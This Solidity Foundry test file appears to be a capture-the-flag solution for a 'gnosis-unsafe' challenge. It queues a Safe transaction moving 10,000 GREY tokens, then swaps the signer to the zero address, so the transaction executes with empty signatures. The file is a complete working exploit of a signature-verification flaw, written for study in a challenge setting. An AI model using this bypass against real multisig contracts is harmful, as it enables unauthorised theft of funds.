// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/gnosis-unsafe/Setup.sol";
import "../src/gnosis-unsafe/Safe.sol";
import "../src/gnosis-unsafe/lib/GREY.sol";

contract GnosisTest is Test {
    Setup public challenge;
    Safe public safe;
    address public player = makeAddr("player");
    GREY public grey;
    Safe.Transaction transaction;
    uint8[3] v;
    bytes32[3] r;
    bytes32[3] s;

    function setUp() public {
        challenge = new Setup();
        safe = challenge.safe();
        grey = challenge.grey();
    }

    function test_exploitGnosis() public {
        vm.startPrank(player);
        challenge.claim();

        transaction = ISafe.Transaction({
            signer: address(0x1337),
            to: address(grey),
            value: 0,
            data: abi.encodeCall(GREY.transfer, (msg.sender, 10_000e18))
        });
        safe.queueTransaction(v, r, s, transaction);
        skip(1 minutes);
        transaction.signer = address(0);
        console.log("signer", transaction.signer); // address(0)
        (bool success,) = safe.executeTransaction(v, r, s, transaction, 0);
        assertTrue(success);

        vm.stopPrank();
    }
}
